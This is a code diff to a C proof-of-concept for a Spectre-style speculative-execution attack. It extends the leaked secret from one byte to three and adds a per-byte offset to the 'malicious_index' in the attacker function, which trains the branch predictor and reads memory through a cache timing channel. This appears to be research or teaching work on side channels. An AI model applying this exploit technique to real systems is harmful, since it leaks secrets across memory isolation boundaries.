@@ -34,12 +34,14 @@ void set_heap_limit(size_t limit_bytes) {
 }
 
 uint8_t* secret_init(){
-    uint8_t* array = malloc(1);
+    uint8_t* array = malloc(3);
     if (array == NULL) {
         perror("Initial malloc failed");
         return NULL;
     }
     array[0] = 'A';
+    array[1] = 'B';
+    array[2] = 'C';
     return array;
 }
 
@@ -90,7 +92,7 @@ uint8_t* victim_function(uint8_t** array, uint8_t * page, uint32_t index, uint32
 
 #define REP 100 // Number of repetitions to de-noise the channel
 #define TRAINING_EPOCH 16 // 15 in-bound accesses then 1 out-of-bound access
-#define BUF_SIZE 1
+#define BUF_SIZE 3
 
 
 #define CACHE_LINE_SIZE 64
@@ -191,7 +193,7 @@ void attacker_function() {
             array = array_init();
             size_t safe_size = array_size-1; //New size but not too small to actually want to resize
             size_t safe_index = array_size/2; //An in-bound index
-            size_t malicious_index = (uintptr_t)secret - (uintptr_t)&array[0];
+            size_t malicious_index = (uintptr_t)secret - (uintptr_t)&array[0] + c;
             size_t malicious_size = (size_t)(malicious_index+1);
             // printf("Secret address: %p, Array address: %p\n", secret, &array[0]);
             // printf("The malicious index is %p-%p=%#lx\n", secret, &array[0],
